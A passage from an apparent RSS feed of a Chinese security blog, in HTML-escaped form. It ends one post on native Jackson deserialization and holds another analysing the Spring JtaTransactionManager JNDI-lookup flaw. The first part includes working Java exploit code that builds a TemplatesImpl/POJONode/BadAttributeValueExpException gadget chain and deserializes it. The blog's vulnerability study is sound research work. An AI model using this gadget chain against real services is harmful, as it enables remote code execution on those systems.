cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;CtClass&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;ctClass&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; classPool.getCtClass(&lt;span class=&#34;string&#34;&gt;&amp;quot;com.fasterxml.jackson.databind.node.BaseJsonNode&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;CtMethod&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;writeReplace&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; ctClass.getDeclaredMethod(&lt;span class=&#34;string&#34;&gt;&amp;quot;writeReplace&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        writeReplace.setName(&lt;span class=&#34;string&#34;&gt;&amp;quot;propeht&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ctClass.toClass();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;byte&lt;/span&gt;[] classBytes = cc.toBytecode();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;byte&lt;/span&gt;[][] code = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;byte&lt;/span&gt;[][]&amp;#123;classBytes&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;TemplatesImpl&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;templates&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;TemplatesImpl&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        setFieldValue(templates, &lt;span class=&#34;string&#34;&gt;&amp;quot;_bytecodes&amp;quot;&lt;/span&gt;, code);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        setFieldValue(templates, &lt;span class=&#34;string&#34;&gt;&amp;quot;_name&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;prophet&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        setFieldValue(templates, &lt;span class=&#34;string&#34;&gt;&amp;quot;_class&amp;quot;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        setFieldValue(templates, &lt;span class=&#34;string&#34;&gt;&amp;quot;_tfactory&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;TransformerFactoryImpl&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;POJONode&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;node&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;POJONode&lt;/span&gt;(templates);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;bad&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;BadAttributeValueExpException&lt;/span&gt;(&lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Field&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;field&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; BadAttributeValueExpException.class.getDeclaredField(&lt;span class=&#34;string&#34;&gt;&amp;quot;val&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        field.setAccessible(&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        field.set(bad, node);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;ObjectOutputStream&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;out&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ObjectOutputStream&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;FileOutputStream&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;ser.ser&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        out.writeObject(bad);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        out.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;ObjectInputStream&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ObjectInputStream&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;FileInputStream&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;ser.ser&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        in.readObject();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        in.close();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;setFieldValue&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Object obj, &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String fieldName, &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Object value)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;Field&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;field&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; obj.getClass().getDeclaredField(fieldName);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        field.setAccessible(&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        field.set(obj, value);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img data-src=&#34;/2025/07/26/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250726125726865.png&#34; alt=&#34;image-20250726125726865&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://pr0phet1.github.io/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
            <title>spring_jtaTranscationMannager漏洞分析</title>
            <link>https://pr0phet1.github.io/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
            <category>web</category>
            <category>反序列化</category>
            <category>java</category>
            <pubDate>Fri, 25 Jul 2025 09:41:36 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;管理依赖&#34;&gt;&lt;a href=&#34;#管理依赖&#34; class=&#34;headerlink&#34; title=&#34;管理依赖&#34;&gt;&lt;/a&gt;管理依赖&lt;/h1&gt;&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;org.springframework&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;spring-tx&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;3.1.0.RELEASE&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;javax.transaction&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;jta&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;1.1&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;用于spring事务管理&lt;/p&gt;
&lt;h1 id=&#34;漏洞分析&#34;&gt;&lt;a href=&#34;#漏洞分析&#34; class=&#34;headerlink&#34; title=&#34;漏洞分析&#34;&gt;&lt;/a&gt;漏洞分析&lt;/h1&gt;&lt;h2 id=&#34;JtaTransactionManager&#34;&gt;&lt;a href=&#34;#JtaTransactionManager&#34; class=&#34;headerlink&#34; title=&#34;JtaTransactionManager&#34;&gt;&lt;/a&gt;JtaTransactionManager&lt;/h2&gt;&lt;p&gt;&lt;img data-src=&#34;/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250721111840300.png&#34; alt=&#34;image-20250721111840300&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到readObject方法中调用了initUserTransactionAndTransactionManager方法&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250721104430676.png&#34; alt=&#34;image-20250721104430676&#34;&gt;&lt;/p&gt;
&lt;p&gt;在initUserTransactionAndTransactionManager方法中又调用了lookupUserTransaction，值为我们设置的userTansactionName&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250721111048635.png&#34; alt=&#34;image-20250721111048635&#34;&gt;&lt;/p&gt;
&lt;p&gt;lookupUserTransaction调用了JndiTemplate对象的lookup方法&lt;/p&gt;
&lt;h2 id=&#34;JndiTemplate&#34;&gt;&lt;a href=&#34;#JndiTemplate&#34; class=&#34;headerlink&#34; title=&#34;JndiTemplate&#34;&gt;&lt;/a&gt;JndiTemplate&lt;/h2&gt;&lt;p&gt;&lt;img data-src=&#34;/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250721111145127.png&#34; alt=&#34;image-20250721111145127&#34;&gt;&lt;/p&gt;
&lt;p&gt;lookup方法嵌套调用真正的lookup，值还是之前的UserTransactionName&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250721111315387.png&#34; alt=&#34;image-20250721111315387&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到在最后调用了execute方法&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250721111459644.png&#34; alt=&#34;image-20250721111459644&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到execute方法内部其实就是&lt;/p&gt;
&lt;p&gt;getContext &amp;#x3D;》 createInitialContext &amp;#x3D;》 ctx &amp;#x3D; InitialContext &amp;#x3D;》InitialContext.lookup(UserTransactionName)&lt;/p&gt;
&lt;p&gt;然后这里的UserTransactionName我们也可以设置&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250721113855893.png&#34; alt=&#34;image-20250721113855893&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/2025/07/25/spring-jtaTranscationMannager%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250721102137222.png&#34; alt=&#34;image-20250721102137222&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
